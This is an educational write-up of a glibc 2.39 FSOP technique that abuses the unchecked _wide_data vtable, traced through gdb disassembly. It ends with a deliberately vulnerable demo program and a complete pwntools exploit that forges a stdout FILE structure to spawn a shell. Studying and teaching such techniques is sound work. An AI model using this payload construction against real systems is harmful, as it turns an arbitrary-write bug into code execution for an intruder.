### make FSOP great again!

**note: there isn't just "one" way to exploit file structures, see the links at the end of this post. in this one, im abusing the fact that there is no check on the validity of the _wide_data vtable by creating a fake jump table. (path=_IO_wfile_overflow->_IO_wdoallocbuf->_IO_WDOALLOCATE)**

```
gef> ptype /o struct _IO_FILE_plus
/* offset      |    size */  type = struct _IO_FILE_plus {
/*      0      |     216 */    FILE file;
/*    216      |       8 */    const struct _IO_jump_t *vtable;

                               /* total size (bytes):  224 */
```
> https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/libioP.h#L325

basically a `_IO_FILE` structure with a `vtable` at the end

```
gef> ptype /ox struct _IO_FILE
/* offset      |    size */  type = struct _IO_FILE {
/* 0x0000      |  0x0004 */    int _flags;
/* XXX  4-byte hole      */
/* 0x0008      |  0x0008 */    char *_IO_read_ptr;
/* 0x0010      |  0x0008 */    char *_IO_read_end;
/* 0x0018      |  0x0008 */    char *_IO_read_base;
/* 0x0020      |  0x0008 */    char *_IO_write_base;
/* 0x0028      |  0x0008 */    char *_IO_write_ptr;
/* 0x0030      |  0x0008 */    char *_IO_write_end;
/* 0x0038      |  0x0008 */    char *_IO_buf_base;
/* 0x0040      |  0x0008 */    char *_IO_buf_end;
/* 0x0048      |  0x0008 */    char *_IO_save_base;
/* 0x0050      |  0x0008 */    char *_IO_backup_base;
/* 0x0058      |  0x0008 */    char *_IO_save_end;
/* 0x0060      |  0x0008 */    struct _IO_marker *_markers;
/* 0x0068      |  0x0008 */    struct _IO_FILE *_chain;
/* 0x0070      |  0x0004 */    int _fileno;
/* 0x0074      |  0x0004 */    int _flags2;
/* 0x0078      |  0x0008 */    __off_t _old_offset;
/* 0x0080      |  0x0002 */    unsigned short _cur_column;
/* 0x0082      |  0x0001 */    signed char _vtable_offset;
/* 0x0083      |  0x0001 */    char _shortbuf[1];
/* XXX  4-byte hole      */
/* 0x0088      |  0x0008 */    _IO_lock_t *_lock;
/* 0x0090      |  0x0008 */    __off64_t _offset;
/* 0x0098      |  0x0008 */    struct _IO_codecvt *_codecvt;
/* 0x00a0      |  0x0008 */    struct _IO_wide_data *_wide_data;
/* 0x00a8      |  0x0008 */    struct _IO_FILE *_freeres_list;
/* 0x00b0      |  0x0008 */    void *_freeres_buf;
/* 0x00b8      |  0x0008 */    size_t __pad5;
/* 0x00c0      |  0x0004 */    int _mode;
/* 0x00c4      |  0x0014 */    char _unused2[20];

                               /* total size (bytes):  216 */
                             }
```
> vtable is at offset 0xd8 (216 in decimal), right after the structure
>
> https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/bits/types/struct_FILE.h#L49

opened streams are joined in a link list via the `_chain` field which allows glibc to close them easily on exit

stdin and stdout also uses file STDIO implementations so im going to follow what happens when we call puts() and try to reason about the file structure... (be warned! lots of _segfaults_ ahead!)

following the disassembly of puts: 

```asm
   0x000072d146487bd0 <+0>:     endbr64                                                                                                                                                 
   0x000072d146487bd4 <+4>:     push   rbp                                                                                                                                              
   0x000072d146487bd5 <+5>:     mov    rbp,rsp                                                                                                                                          
   0x000072d146487bd8 <+8>:     push   r15                                                                                                                                              
   0x000072d146487bda <+10>:    push   r14                                                                                                                                              
   0x000072d146487bdc <+12>:    push   r13                                                                                                                                              
   0x000072d146487bde <+14>:    push   r12                                                                                                                                              
   0x000072d146487be0 <+16>:    mov    r12,rdi                                                                                                                                          
   0x000072d146487be3 <+19>:    push   rbx                                                                                                                                              
   0x000072d146487be4 <+20>:    sub    rsp,0x18                                                                                                                                         
   0x000072d146487be8 <+24>:    call   0x72d146428500 <*ABS*+0xb4cb0@plt>                                                                                                               
   0x000072d146487bed <+29>:    mov    r14,QWORD PTR [rip+0x17b22c]        # 0x72d146602e20                                                                                             
   0x000072d146487bf4 <+36>:    mov    rbx,rax                                                                                                                                          
   0x000072d146487bf7 <+39>:    mov    r13,QWORD PTR [r14]                                                                                                                              
   0x000072d146487bfa <+42>:    test   DWORD PTR [r13+0x0],0x8000                                                                                                                       
   0x000072d146487c02 <+50>:    je     0x72d146487cd0 <__GI__IO_puts+256>                                                                                                               
   0x000072d146487c08 <+56>:    mov    rdi,r13                                                                                                                                          
   0x000072d146487c0b <+59>:    mov    eax,DWORD PTR [rdi+0xc0]                                                                                                                         
   0x000072d146487c11 <+65>:    test   eax,eax                                                                                                                                          
   0x000072d146487c13 <+67>:    jne    0x72d146487d23 <__GI__IO_puts+339>                                                                                                               
   0x000072d146487c19 <+73>:    mov    DWORD PTR [rdi+0xc0],0xffffffff                                                                                                                  
   0x000072d146487c23 <+83>:    mov    r15,QWORD PTR [rdi+0xd8]                                                                                                                         
   0x000072d146487c2a <+90>:    lea    rdx,[rip+0x17a2af]        # 0x72d146601ee0 <__io_vtables>                                                                                        
   0x000072d146487c31 <+97>:    mov    rax,r15                                                                                                                                          
   0x000072d146487c34 <+100>:   sub    rax,rdx                                                                                                                                          
   0x000072d146487c37 <+103>:   cmp    rax,0x92f                                                                                                                                        
   0x000072d146487c3d <+109>:   ja     0x72d146487db0 <__GI__IO_puts+480>                                                                                                               
   0x000072d146487c43 <+115>:   mov    rdx,rbx                                                                                                                                          
   0x000072d146487c46 <+118>:   mov    rsi,r12                                                                                                                                          
=> 0x000072d146487c49 <+121>:   call   QWORD PTR [r15+0x38]  
```
pointer to the stdout struct is loaded to rdi via operations at offset 29, 39 and 56

offset 29 holds a pointer in libc that points to a pointer in the .bss(???) which points to stdout struct
> 0x72d146602e20 -> 0x404040 <stdout@GLIBC_2.2.5>:  0x000072d1466045c0

and later offset to vtable is added to rdi and moved to r15 (at offset r15) 
> 0x72d1466045c0+0xd8 -> 0x72d146604698 <_IO_2_1_stdout_+216>:   0x000072d146602030

now r15 is a pointer to `_IO_file_jumps`
> 0x72d146602030 <_IO_file_jumps>:        0x0000000000000000

the last offset to the particular jump to a function is added at offset 121 and called (which is _IO_new_file_xsputn)
> 0x72d146602030+0x38 -> 0x72d146602068 <_IO_file_jumps+56>:     0x000072d1464939d0

in `_IO_new_file_xsputn`:

```asm
   0x000072d146493a73 <+163>:   mov    rax,QWORD PTR [rbx+0xd8]                                                                                                                         
   0x000072d146493a7a <+170>:   lea    r12,[rip+0x16e45f]        # 0x72d146601ee0 <__io_vtables>                                                                                        
=> 0x000072d146493a81 <+177>:   mov    rdx,rax                                                                                                                                          
   0x000072d146493a84 <+180>:   sub    rdx,r12                                                                                                                                          
   0x000072d146493a87 <+183>:   cmp    rdx,0x92f                                                                                                                                        
   0x000072d146493a8e <+190>:   ja     0x72d146493c60 <_IO_new_file_xsputn+656>                                                                                                         
   0x000072d146493a94 <+196>:   mov    esi,0xffffffff                                                                                                                                   
   0x000072d146493a99 <+201>:   mov    rdi,rbx                                                                                                                                          
   0x000072d146493a9c <+204>:   call   QWORD PTR [rax+0x18] 
```

vtable is moved to rax and another function in the `_IO_file_jumps` is called (which is `_IO_file_overflow`)
> 0x000072d146602030+0x18 -> 0x72d146602048 <_IO_file_jumps+24>:     0x000072d146492de0

_IO_file_overflow:
```asm
  0x000072d146492ec9 <+233>:   jmp    0x72d1464924b0 <_IO_new_do_write> 
```

direct jump to `_IO_new_do_write`

`_IO_new_do_write` :

```asm
   0x000072d14649253b <+139>:   mov    r14,QWORD PTR [rbx+0xd8]
   0x000072d146492542 <+146>:   mov    rax,r14
   0x000072d146492545 <+149>:   sub    rax,r15
   0x000072d146492548 <+152>:   cmp    rax,0x92f
   0x000072d14649254e <+158>:   ja     0x72d146492600 <_IO_new_do_write+336>
   0x000072d146492554 <+164>:   mov    rdx,r12
   0x000072d146492557 <+167>:   mov    rsi,r13
=> 0x000072d14649255a <+170>:   mov    rdi,rbx
   0x000072d14649255d <+173>:   call   QWORD PTR [r14+0x78]
```
vtable is loaded to r14 and another call to a function in `_IO_file_jumps` is made (`_IO_file_write`)

this `_IO_file_write` function called `__GI___libc_write` then interestingly, it called `syscall`. we hit the bare write syscall just wanted to show :D

```
[+] Detected syscall (arch:X86, mode:64)
    write(unsigned int fd, const char __user *buf, size_t count)
[+] Parameter            Register             Value
    RET                  $rax                 -                   
    NR                   $rax                 0x1
    fd                   $rdi                 0x0000000000000001
    buf                  $rsi                 0x000000002661c2a0  ->  0x0a676e6974736574 'testing\n458740\n'
    count                $rdx                 0x0000000000000008
```

after the syscall we came back to `_IO_file_write` and it returned to `_IO_do_write->_IO_file_xsputn->puts `

and now puts is going to call `__GI___overflow` but the text is already written to stdout so i think im done

so lets put it together:

**call to puts -> _IO_new_file_xsputn -> _IO_file_overflow -> _IO_new_do_write (jumped) -> _IO_file_write -> __GI___libc_write -> write syscall -> back to puts**

okay. now how can i exploit this XD ?

everything is offsetted from `0x404040 <stdout@GLIBC_2.2.5>: 0x000072d1466045c0` and they are both writable.

hmm... the very first offset was `vtable -> _IO_file_jumps+0x38` which is a call to `_IO_new_file_xsputn`

maybe a partial overwrite on vtable can do something... (lsb is paged)

```c
  /* _IO_file_jumps  */
  [IO_FILE_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_file_finish),
    JUMP_INIT (overflow, _IO_file_overflow),
    JUMP_INIT (underflow, _IO_file_underflow),
    JUMP_INIT (uflow, _IO_default_uflow),
    JUMP_INIT (pbackfail, _IO_default_pbackfail),
    JUMP_INIT (xsputn, _IO_file_xsputn),
    JUMP_INIT (xsgetn, _IO_file_xsgetn),
    JUMP_INIT (seekoff, _IO_new_file_seekoff),
    JUMP_INIT (seekpos, _IO_default_seekpos),
    JUMP_INIT (setbuf, _IO_new_file_setbuf),
    JUMP_INIT (sync, _IO_new_file_sync),
    JUMP_INIT (doallocate, _IO_file_doallocate),
    JUMP_INIT (read, _IO_file_read),
    JUMP_INIT (write, _IO_new_file_write),
    JUMP_INIT (seek, _IO_file_seek),
    JUMP_INIT (close, _IO_file_close),
    JUMP_INIT (stat, _IO_file_stat),
    JUMP_INIT (showmanyc, _IO_default_showmanyc),
    JUMP_INIT (imbue, _IO_default_imbue)
  },
```
> https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/vtables.c#L142

let's see if i can call `_IO_file_underflow` ...

```asm
0x72d146602030 <_IO_file_jumps>:        0x0000000000000000      0x0000000000000000
0x72d146602040 <_IO_file_jumps+16>:     0x000072d146491a30      0x000072d146492de0
0x72d146602050 <_IO_file_jumps+32>:     0x000072d146492630      0x000072d146495590
0x72d146602060 <_IO_file_jumps+48>:     0x000072d146496dd0      0x000072d1464939d0
0x72d146602070 <_IO_file_jumps+64>:     0x000072d146493d10      0x000072d146493150
0x72d146602080 <_IO_file_jumps+80>:     0x000072d146495cb0      0x000072d1464923f0
0x72d146602090 <_IO_file_jumps+96>:     0x000072d146493000      0x000072d146485110
0x72d1466020a0 <_IO_file_jumps+112>:    0x000072d1464938a0      0x000072d146493930
0x72d1466020b0 <_IO_file_jumps+128>:    0x000072d1464938c0      0x000072d146493920
0x72d1466020c0 <_IO_file_jumps+144>:    0x000072d1464938d0      0x000072d146496f80
0x72d1466020d0 <_IO_file_jumps+160>:    0x000072d146496f90      0x0000000000000000
```

I want `_IO_file_jumps+56` to be `_IO_file_underflow`... (which is at `_IO_file_jumps+10`)

and vtable is 0x72d146602030... so 0x72d146602030 - 0x38 + 0x10 = 0x72d146602018

one byte overwrite to 18 then...

this is my file structure so far:

> one thing that helps a lot digging in gdb is this amazing fork of gef by [bata24](https://github.com/bata24/gef) (`exec-untill call` my beloved)

```python3
payload = b"\x84\x2a\xad\xfb" + p32(0x00) # _flags + 4-byte hole
payload += b"\x00"*88 # *_IO_read_ptr -> *_IO_save_end
payload += b"\x00"*8 # *_markers
payload += b"\x00"*8 # *_chain
payload += b"\x00"*4 # _fileno
payload += b"\x00"*4 # _flags2
payload += b"\xff"*8 # _old_offset
payload += b"\x00"*2 # _cur_coloumn
payload += b"\x00"*1 # _vtable_offset
payload += b"\x01"*1 + p32(0x00) # _shortbuf[1] + 4-byte hole
payload += b"\x41"*8 # *_lock
payload += b"\xff"*8 # _offset
payload += b"\x00"*8 # *_codecvt
payload += b"\x00"*8 # *_wide_data
payload += b"\x00"*8 # *_freeres_list
payload += b"\x00"*8 # *_freeres_buf
payload += b"\x00"*8 # *__pad5
payload += b"\xff"*4 # _mode
payload += b"\x00"*20 # _unused2[20]
payload += b"\x18" # VTABLE
```

and it segfaulted because of `*_lock...`
```asm
 <puts+0x117>   mov    rax, QWORD PTR [rdi + 0x8]
```
> memory access: $rdi+0x8 = 0x4141414141414149 

you should have a libc leak by now waiting to be used... (i just realized we don't need to do a one byte overwrite because we can calculate the whole address with a libc leak...)

calculate the offset to the `_IO_stdfile_1_lock`, change the `*_lock` back to what it was and set a bp at `puts+0x117` then hit next with hopes and prays..

woah, a succesful call to `_IO_file_underflow` and it didn't write out the text to stdout when it returned from puts(). i can call anything in `_IO_file_jump` !

question is... how to leverage this to pop a shell?

```C
#define _IO_JUMPS(THIS) (THIS)->vtable
#define _IO_JUMPS_FILE_plus(THIS) \
  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)
(...)
#if _IO_JUMPS_OFFSET
# define _IO_JUMPS_FUNC(THIS) \
  (IO_validate_vtable                                                   \
   (*(struct _IO_jump_t **) ((void *) &_IO_JUMPS_FILE_plus (THIS)	\
			     + (THIS)->_vtable_offset)))
# define _IO_JUMPS_FUNC_UPDATE(THIS, VTABLE)				\
  (*(const struct _IO_jump_t **) ((void *) &_IO_JUMPS_FILE_plus (THIS)	\
				  + (THIS)->_vtable_offset) = (VTABLE))
# define _IO_vtable_offset(THIS) (THIS)->_vtable_offset
#else
# define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))
# define _IO_JUMPS_FUNC_UPDATE(THIS, VTABLE) \
  (_IO_JUMPS_FILE_plus (THIS) = (VTABLE))
# define _IO_vtable_offset(THIS) 0
#endif
```
> https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/libioP.h#L99

stdin/stdout/stderr use the `_IO_file_jumps` vtable, and when the function pointer in the vtable needs to be called, a *macro* is used to call it. 

you can see the `IO_validate_vtable` check for `_IO_file_jumps` vtable above in the code.

this is the function for that purpose:

```c
/* Check if unknown vtable pointers are permitted; otherwise,
   terminate the process.  */
void _IO_vtable_check (void) attribute_hidden;

/* Perform vtable pointer validation.  If validation fails, terminate
   the process.  */
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  uintptr_t ptr = (uintptr_t) vtable;
  uintptr_t offset = ptr - (uintptr_t) &__io_vtables;
  if (__glibc_unlikely (offset >= IO_VTABLES_LEN))
    /* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */
    _IO_vtable_check ();
  return vtable;
}
```

but when calling the functions in `_wide_vtable`, there is no checks on its vtable.


```C
#define _IO_WIDE_JUMPS(THIS) \
  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable
#define _IO_CHECK_WIDE(THIS) \
  (_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data) != NULL)
(...)
#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)
#define JUMP_FIELD(TYPE, NAME) TYPE NAME
#define JUMP0(FUNC, THIS) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS)
#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)
#define JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2)
#define JUMP3(FUNC, THIS, X1,X2,X3) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1,X2, X3)
#define JUMP_INIT(NAME, VALUE) VALUE
#define JUMP_INIT_DUMMY JUMP_INIT(dummy, 0), JUMP_INIT (dummy2, 0)

#define WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS)
#define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)
#define WJUMP2(FUNC, THIS, X1, X2) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2)
#define WJUMP3(FUNC, THIS, X1,X2,X3) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS, X1,X2, X3)
```
> https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/libioP.h#L99

okay so, lets change the vtable `_IO_FILE` to `_IO_wfile_jumps` and see what happens... (what worst could happen?)

...segfault at `__GI__IO_wfile_overflow+35`:

```asm
   <+25>:    mov    rax,QWORD PTR [rdi+0xa0]                                                                                                                         
   <+32>:    mov    r12d,esi                                                                                                                                         
=> <+35>:    mov    rsi,QWORD PTR [rax+0x18]  
```

rdi is pointing to stdout and we are moving the address at `stdout+0xa0` to rax (which is `struct *_wide_data`)

we segfaulted because our `_wide_data struct` was 0x00... lets make it point to somewhere we control (like our buffer)

another run and now we are about to call `__GI__IO_wdoallocbuf` with stdout in rdi:

```asm
Dump of assembler code for function __GI__IO_wdoallocbuf:                                                                                                                               
   0x0000714d1a68ae60 <+0>:     endbr64                                                                                                                                                 
   0x0000714d1a68ae64 <+4>:     mov    rax,QWORD PTR [rdi+0xa0]                                                                                                                         
=> 0x0000714d1a68ae6b <+11>:    cmp    QWORD PTR [rax+0x30],0x0                                                                                                                         
   0x0000714d1a68ae70 <+16>:    je     0x714d1a68ae78 <__GI__IO_wdoallocbuf+24>                                                                                                         
   0x0000714d1a68ae72 <+18>:    ret                                                                                                                                                     
   0x0000714d1a68ae73 <+19>:    nop    DWORD PTR [rax+rax*1+0x0]                                                                                                                        
   0x0000714d1a68ae78 <+24>:    push   rbp                                                                                                                                              
   0x0000714d1a68ae79 <+25>:    mov    rbp,rsp                                                                                                                                          
   0x0000714d1a68ae7c <+28>:    push   r13                                                                                                                                              
   0x0000714d1a68ae7e <+30>:    push   r12                                                                                                                                              
   0x0000714d1a68ae80 <+32>:    push   rbx                                                                                                                                              
   0x0000714d1a68ae81 <+33>:    mov    rbx,rdi                                                                                                                                          
   0x0000714d1a68ae84 <+36>:    sub    rsp,0x8
   0x0000714d1a68ae88 <+40>:    test   BYTE PTR [rdi],0x2
   0x0000714d1a68ae8b <+43>:    jne    0x714d1a68aef8 <__GI__IO_wdoallocbuf+152>
   0x0000714d1a68ae8d <+45>:    mov    rax,QWORD PTR [rax+0xe0]
   0x0000714d1a68ae94 <+52>:    call   QWORD PTR [rax+0x68]
```

looks like it is moving `_wide_data` pointer to rax again (which is our buffer). our goal is to reach the call at _GI__IO_wdoallocbuf+52 so we need to bypass the checks at __GI__IO_wdoallocbuf+11 and __GI__IO_wdoallocbuf+40

> 0x0000714d1a68ae6b <+11>:    cmp    QWORD PTR [rax+0x30],0x0   
just make` buffer+0x30` is equal to `0x00`, noted.

> ```asm
> 0x0000714d1a68ae88 <+40>:    test   BYTE PTR [rdi],0x2
> 0x0000714d1a68ae8b <+43>:    jne    0x714d1a68aef8 <__GI__IO_wdoallocbuf+152>
> ```

and for this check, rdi is pointing to stdout's magic bytes (0xfbad2a84). can try to change it to 0x2

```asm
Dump of assembler code for function __GI__IO_wfile_overflow:                                                                                                                            
   0x000079da8628ce10 <+0>:     endbr64                                                                                                                                                 
   0x000079da8628ce14 <+4>:     push   rbp                                                                                                                                              
   0x000079da8628ce15 <+5>:     mov    rbp,rsp                                                                                                                                          
   0x000079da8628ce18 <+8>:     push   r12                                                                                                                                              
   0x000079da8628ce1a <+10>:    push   rbx                                                                                                                                              
   0x000079da8628ce1b <+11>:    mov    edx,DWORD PTR [rdi]                                                                                                                              
   0x000079da8628ce1d <+13>:    mov    rbx,rdi                                                                                                                                          
=> 0x000079da8628ce20 <+16>:    test   dl,0x8                                                                                                                                           
   0x000079da8628ce23 <+19>:    jne    0x79da8628cf70 <__GI__IO_wfile_overflow+352>                                                                                                     
   0x000079da8628ce29 <+25>:    mov    rax,QWORD PTR [rdi+0xa0]                                                                                                                         
   0x000079da8628ce30 <+32>:    mov    r12d,esi                                                                                                                                         
   0x000079da8628ce33 <+35>:    mov    rsi,QWORD PTR [rax+0x18]                                                                                                                         
   0x000079da8628ce37 <+39>:    test   dh,0x8                                                                                                                                           
   0x000079da8628ce3a <+42>:    jne    0x79da8628cee0 <__GI__IO_wfile_overflow+208>                                                                                                     
   0x000079da8628ce40 <+48>:    test   rsi,rsi                                                                                                                                          
   0x000079da8628ce43 <+51>:    je     0x79da8628cee5 <__GI__IO_wfile_overflow+213> 
```

now i blowed up on this check... looks like we shouldn't change the magic bytes (another check on it).. fixed it and continuing

...another segfault:

```asm
<_IO_wfile_overflow+0xb2>   mov    DWORD PTR [rcx], r12d
```
> Cannot access memory at address 0x6161616661616165

segfaulting because it is triyng to move the pointer of the string that is passed to the puts() into somewhere in my buffer. 

good thing that i sent a cyclic. 32 bytes from the buffer, gotta make it point to somewhere writable like the end-ish of the buffer...

alright, here we go

this time no segfault and that is because we didn't call `__GI__IO_wdoallocbuf` at all...

```asm
  <_IO_wfile_overflow+0xd0>   test   rsi, rsi 
  <_IO_wfile_overflow+0xd3>   jne    0x7eb2d1c8cea2 <__GI__IO_wfile_overflow+0x92> 
```

this check was failed, again, due to my payload in the buffer. `buffer+48` should equal to 0 in order to bypass it. 

and yet another segfault...

smile, because we actually segfaulted at `__GI__IO_wdoallocbuf+52` :D

> __GI__IO_wdoallocbuf+52

```asm
Dump of assembler code for function __GI__IO_wdoallocbuf:                                                                                                                               
   0x0000714d1a68ae60 <+0>:     endbr64                                                                                                                                                 
   0x0000714d1a68ae64 <+4>:     mov    rax,QWORD PTR [rdi+0xa0]                                                                                                                         
=> 0x0000714d1a68ae6b <+11>:    cmp    QWORD PTR [rax+0x30],0x0                                                                                                                         
   0x0000714d1a68ae70 <+16>:    je     0x714d1a68ae78 <__GI__IO_wdoallocbuf+24>                                                                                                         
   0x0000714d1a68ae72 <+18>:    ret                                                                                                                                                     
   0x0000714d1a68ae73 <+19>:    nop    DWORD PTR [rax+rax*1+0x0]                                                                                                                        
   0x0000714d1a68ae78 <+24>:    push   rbp                                                                                                                                              
   0x0000714d1a68ae79 <+25>:    mov    rbp,rsp                                                                                                                                          
   0x0000714d1a68ae7c <+28>:    push   r13                                                                                                                                              
   0x0000714d1a68ae7e <+30>:    push   r12                                                                                                                                              
   0x0000714d1a68ae80 <+32>:    push   rbx                                                                                                                                              
   0x0000714d1a68ae81 <+33>:    mov    rbx,rdi                                                                                                                                          
   0x0000714d1a68ae84 <+36>:    sub    rsp,0x8
   0x0000714d1a68ae88 <+40>:    test   BYTE PTR [rdi],0x2
   0x0000714d1a68ae8b <+43>:    jne    0x714d1a68aef8 <__GI__IO_wdoallocbuf+152>
   0x0000714d1a68ae8d <+45>:    mov    rax,QWORD PTR [rax+0xe0]
   0x0000714d1a68ae94 <+52>:    call   QWORD PTR [rax+0x68]
```

it moved the _wide_data pointer (which we overwrite it with our buffer) to the rax 

we succesfully passed the checks and now rax should point to _wide_vtable then it should call a function from an offset in vtable

that's what was supposed to happen if we didn't overwrite rax with our controlled address.

so we just need carefully play with the offsets and pointers to make a call to a function that we want...

we need to make `rax+0xe0` to point somewhere close our buffer (preferably behind the buffer), so we can call a function that is some offset (+0x68) from that close address into our buffer.

```asm
__libc_system (
   QWORD var_0 = 0x000077c8684045c0 <_IO_2_1_stdout_>  ->  0x00000000fbad2a84
)
------
```

so close... we are able to call system but rdi is pointing to the magic bytes

before moving on, i've tried one_gadget but none of the registers fit the constraints 🫤 (glibc 2.39)

hmmm, can we change the magic bytes to "/bin/sh" and still somehow reach the last call?

```asm
$rbx   : 0x00007a7cc98045c0 <_IO_2_1_stdout_>  ->  0x00007a7cc97cb42f  ->  0x0068732f6e69622f ('/bin/sh'?)                                                                              
$rcx   : 0x00007a7cc971ba61 <read+0x11>  ->  0x4f77fffff0003d48 ('H='?)                                                                                                                 
$rdx   : 0x00000000c97cb42f
$rdi   : 0x00007a7cc98045c0 <_IO_2_1_stdout_>  ->  0x00007a7cc97cb42f  ->  0x0068732f6e69622f ('/bin/sh'?) 

(...)
    0x7a7cc968ce1b 8b17                    <_IO_wfile_overflow+0xb>   mov    edx, DWORD PTR [rdi] 
    0x7a7cc968ce1d 4889fb                  <_IO_wfile_overflow+0xd>   mov    rbx, rdi 
 -> 0x7a7cc968ce20 f6c208                  <_IO_wfile_overflow+0x10>   test   dl, 0x8 
    0x7a7cc968ce23 0f8547010000            <_IO_wfile_overflow+0x13>   jne    0x7a7cc968cf70 <__GI__IO_wfile_overflow+0x160> 
```
> rdi is already a pointer, no need to point again. this one is a bad example might delete it later

suprisingly, adding a space before (" /binsh") solved the issue. turns out, `test dl, 0x8` checks the third bit in the `dl` register by ANDing it with `0x8` and `test   BYTE PTR [rdi],0x2` performs a bitwise AND between the byte at memory stored in `rdi` and `0x2`. don't quote me on that tho. (i used chatgpt for the first time 😮‍💨)

and finally, thanks to the power of gdb, i got my shell by trying countless of times until i didn't segfault :p (that's definitely one way to learn it... learning by breaking things)

[make.fsop.great.again.webm](https://github.com/user-attachments/assets/1945ece9-3174-4904-9d51-1837e9e9e25d)


here is the demo and the exploit script:

```c
// gcc -g demo.c -o demo -no-pie
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

char buf[0x256];

int main(){
	uint64_t addr;
	int size;
	printf("%p\n", stdout);
	printf("%p\n", system);
	printf("buffer at %p\nreading into the buffer\n", buf);
	scanf("%s", &buf);
	puts("addr?");
	scanf("%lx", &addr);
	puts("size?");
	scanf("%d", &size);
	puts("data?");
	fread((void *)addr,size,1,stdin);
	puts("testing\n");

	return 0;
}
```

```python3
#!/usr/bin/env python3

from pwn import *
'''
p = gdb.debug("./demo", gdbscript="""
    b *main+291
    b *main+321
    b *puts+121
    c
""")
'''
p = process("./demo")
stdout = int(p.recvline().strip(), 16)
system = int(p.recvline().strip(), 16)
p.recvuntil(b"at ")
buffer = int(p.recvline().strip(), 16)

libc_base = system - 0x58740
binsh = libc_base + 0x1cb42f

print(f"libc base: {hex(libc_base)}")
print(f"stdout: {hex(stdout)}")
print(f"buffer at: {hex(buffer)}")

_lock = libc_base + 0x205710
file_jumps = libc_base + 0x202030
wfile_jumps = libc_base + 0x202228

jmp_to = wfile_jumps - 0x38 + 0x18 # the offset we want to call
print(f"jumping to {hex(jmp_to)}")

# notes for the file structure:
# the space before "/bin/sh" is needed to bypass checks
# *_wide_data should be some memory in our control
# *_lock is needed

#payload = b"\x84\x2a\xad\xfb" + p32(0x00) # _flags + 4-byte hole
payload = b" /bin/sh" # _flags + 4-byte hole
payload += b"\x00"*88 # *_IO_read_ptr -> *_IO_save_end
payload += b"\x00"*8 # *_markers
payload += b"\x00"*8 # *_chain
payload += b"\x00"*4 # _fileno
payload += b"\x00"*4 # _flags2
payload += b"\xff"*8 # _old_offset
payload += b"\x00"*2 # _cur_coloumn
payload += b"\x00"*1 # _vtable_offset
payload += b"\x01"*1 + p32(0x00) # _shortbuf[1] + 4-byte hole
payload += p64(_lock) # *_lock
payload += b"\xff"*8 # _offset
payload += b"\x00"*8 # *_codecvt
payload += p64(buffer) # *_wide_data
payload += b"\x00"*8 # *_freeres_list
payload += b"\x00"*8 # *_freeres_buf
payload += b"\x00"*8 # *__pad5
payload += b"\xff"*4 # _mode
payload += b"\x00"*20 # _unused2[20]
payload += p64(jmp_to) # VTABLE

# every offset is crucial
# key notes for the data in buffer:
# bytes at offset 0, 8, 24 and 48 are for the checks
# offset 40 holds an address that should be writable
# offset 216 holds a pointer to our fake _wide_struct vtable (easier to offset the function that will be called if its behind our buffer)
# offset 54 holds a pointer to the function we will call via fake _wide_struct vtable

p.sendlineafter(b"the buffer\n", p64(0x08) + p64(0x02) + b"a"*8 + p64(0x00) + p64(buffer+112) + b"b"*8 + p64(0x00) + p64(system) + b"c"*160 + p64(buffer-48))
p.sendlineafter(b"addr?\n", hex(stdout-8).encode('utf-8')) 
p.sendlineafter(b"size?\n", f"{len(payload)+8}".encode('utf-8'))
# p.sendlineafter(b"size?\n", f"8")
# ones are not related to the file structure (padding)
p.sendafter(b"data?\n", b"\x01"*7 + payload) 

p.interactive()
```
also some links that helped me make quick sanity checks throughout this:
- https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/
-  https://niftic.ca/posts/fsop/
- https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/EN%20-%20Play%20with%20FILE%20Structure%20-%20Yet%20Another%20Binary%20Exploit%20Technique%20-%20An-Jie%20Yang.pdf
- https://blog.kylebot.net/2022/10/22/angry-FSROP/
	> I really wish to learn angr management...

